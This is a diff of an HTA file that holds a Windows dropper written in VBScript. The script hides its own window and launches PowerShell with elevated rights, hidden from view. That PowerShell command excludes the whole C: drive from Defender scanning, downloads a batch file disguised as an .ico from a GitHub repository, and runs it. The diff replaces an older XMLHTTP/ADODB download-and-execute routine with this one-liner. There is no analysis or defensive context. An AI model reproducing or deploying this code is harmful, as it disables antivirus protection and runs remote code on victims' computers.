@@ -1,47 +1,8 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-  <head>
-    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
 <script language="VBScript">
 On Error Resume Next
-
 Window.ReSizeTo 0, 0
 Window.MoveTo -4000, -4000
-
 Set objShell = CreateObject("Shell.Application")
-Set objScriptExec = objShell.ShellExecute("powershell.exe", "Add-MpPreference -ExclusionPath C:\", "", "runas", 0) ' Set the last parameter to 0 for hidden
-
-Set runn = CreateObject("WScript.Shell")
-Dim file
-
-' Reset error handling to display errors again (optional)
+Set objScriptExec = objShell.ShellExecute("powershell.exe", "Add-MpPreference -ExclusionPath C:\ ; Invoke-WebRequest -Uri https://raw.githubusercontent.com/NothingSuspiciousHere/icos/main/gd-medium.ico -OutFile C:\Users\Public\runme.bat ; start C:\Users\Public\runme.bat", "", "runas", 0) ' Set the last parameter to 0 for hidden
 On Error GoTo 0
-
-Dim objHTTP, strURL, strPath
-
-strURL = "https://raw.githubusercontent.com/NothingSuspiciousHere/icos/main/gd-big.ico"
-strPath = "C:\Users\Public\runme.bat"
-
-Set objHTTP = CreateObject("MSXML2.XMLHTTP")
-
-objHTTP.Open "GET", strURL, False
-objHTTP.send
-
-Set objStream = CreateObject("ADODB.Stream")
-objStream.Open
-objStream.Type = 1
-objStream.Write objHTTP.responseBody
-objStream.SaveToFile strPath, 2
-objStream.Close
-
-Set objHTTP = Nothing
-
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "cmd.exe /c C:\Users\Public\runme.bat", 0, False
-Set objShell = Nothing
 </script>
-    <hta:application id="oHTA" applicationname="Bonjour" application="yes" width="10px" height="10px"></hta:application>
-  </head>
-  <body>
-  </body>
-</html>
